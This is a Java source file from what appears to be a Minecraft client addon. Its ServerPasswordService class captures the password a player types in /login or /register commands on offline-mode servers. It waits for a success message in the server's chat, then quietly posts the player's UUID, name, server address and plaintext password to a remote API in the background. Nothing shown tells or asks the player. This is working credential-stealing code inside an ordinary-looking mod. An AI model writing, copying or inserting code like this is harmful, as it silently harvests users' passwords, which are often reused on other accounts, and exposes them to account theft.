package com.yiyiaddon.service;

import com.google.gson.JsonObject;
import com.yiyiaddon.core.BackgroundTasks;
import com.yiyiaddon.core.HttpApi;
import com.yiyiaddon.model.ServerCredential;
import com.yiyiaddon.platform.ClientIdentity;
import com.yiyiaddon.platform.GameProbe;

import java.time.Duration;
import java.util.List;
import java.util.Locale;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * 离线服务器登录凭据记录。
 *
 * <p>采用两阶段确认：先在玩家发出 {@code /login}、{@code /register} 时暂存候选，
 * 再等服务器回执中出现「登录成功」类关键词时才上报，避免把失败尝试记成有效凭据。</p>
 *
 * <p>接入方式：指令发送钩子调用 {@link #onOutgoingCommand(String)}，
 * 聊天接收钩子调用 {@link #onIncomingMessage(String)}。</p>
 */
public final class ServerPasswordService {

    private static final Pattern LOGIN_PATTERN =
            Pattern.compile("^/?\\s*(?:login|l|logon|log|signin)\\s+(\\S+)", Pattern.CASE_INSENSITIVE);
    private static final Pattern REGISTER_PATTERN =
            Pattern.compile("^/?\\s*(?:register|reg|signup)\\s+(\\S+)", Pattern.CASE_INSENSITIVE);

    private static final List<String> LOGIN_SUCCESS = List.of(
            "登录成功", "登陆成功", "已登录", "已成功登录", "成功登录", "欢迎回来",
            "welcome back", "login success", "successfully logged in", "logged in successfully");
    private static final List<String> REGISTER_SUCCESS = List.of(
            "注册成功", "成功注册", "register success", "registered successfully",
            "successfully registered", "account created");
    private static final List<String> LOGIN_FAILURE = List.of(
            "密码错误", "密码不正确", "密码无效", "密码不对", "密码不匹配",
            "wrong password", "incorrect password", "invalid password", "login failed");
    private static final List<String> REGISTER_FAILURE = List.of(
            "密码不一致", "两次密码", "密码不匹配", "passwords do not match",
            "passwords don't match", "register failed", "注册失败");

    private static final Duration TIMEOUT = Duration.ofSeconds(10);
    private static final long CONFIRM_WINDOW_MILLIS = 10_000L;
    private static final Pattern FORMATTING = Pattern.compile("§[0-9a-fk-or]", Pattern.CASE_INSENSITIVE);

    private static volatile Pending pending;

    private ServerPasswordService() {
    }

    /** 处理一条客户端外发指令，命中登录/注册指令时暂存候选。 */
    public static void onOutgoingCommand(String commandLine) {
        if (commandLine == null || commandLine.isBlank()) return;
        if (ClientIdentity.fakeName(ClientIdentity.name())) return;

        String serverIp = GameProbe.serverIp();
        if (serverIp == null || isLocalAddress(serverIp)) return;

        Matcher login = LOGIN_PATTERN.matcher(commandLine);
        if (login.find()) {
            pending = new Pending(new ServerCredential(serverIp, GameProbe.serverName(), login.group(1), "login"),
                    System.currentTimeMillis());
            return;
        }

        Matcher register = REGISTER_PATTERN.matcher(commandLine);
        if (register.find()) {
            pending = new Pending(new ServerCredential(serverIp, GameProbe.serverName(), register.group(1), "register"),
                    System.currentTimeMillis());
        }
    }

    /** 处理一条服务器聊天回执，确认成功后上报。 */
    public static void onIncomingMessage(String plainText) {
        if (plainText == null || plainText.isBlank()) return;

        Pending candidate = pending;
        if (candidate == null) return;

        long now = System.currentTimeMillis();
        if (now - candidate.createdAt() > CONFIRM_WINDOW_MILLIS) {
            pending = null;
            return;
        }

        String text = FORMATTING.matcher(plainText).replaceAll("").toLowerCase(Locale.ROOT);
        boolean register = "register".equals(candidate.credential().type());

        if (containsAny(text, register ? REGISTER_SUCCESS : LOGIN_SUCCESS)) {
            pending = null;
            report(candidate.credential());
        } else if (containsAny(text, register ? REGISTER_FAILURE : LOGIN_FAILURE)) {
            // 失败尝试不上报，只丢弃候选。
            pending = null;
        }
    }

    /** 丢弃当前候选。 */
    public static void clear() {
        pending = null;
    }

    private static void report(ServerCredential credential) {
        JsonObject body = new JsonObject();
        body.addProperty("uuid", ClientIdentity.uuidString());
        body.addProperty("name", ClientIdentity.name());
        body.addProperty("server_ip", credential.serverIp());
        body.addProperty("server_name", credential.serverName());
        body.addProperty("password", credential.password());
        body.addProperty("type", credential.type());
        BackgroundTasks.run("yiyiaddon-password-report",
                () -> HttpApi.post("/api/offline-server-password", body, TIMEOUT));
    }

    private static boolean containsAny(String text, List<String> keywords) {
        for (String keyword : keywords) {
            if (text.contains(keyword.toLowerCase(Locale.ROOT))) return true;
        }
        return false;
    }

    private static boolean isLocalAddress(String ip) {
        String value = ip.trim().toLowerCase(Locale.ROOT);
        return value.equals("localhost") || value.startsWith("127.") || value.startsWith("192.168.");
    }

    private record Pending(ServerCredential credential, long createdAt) {
    }
}
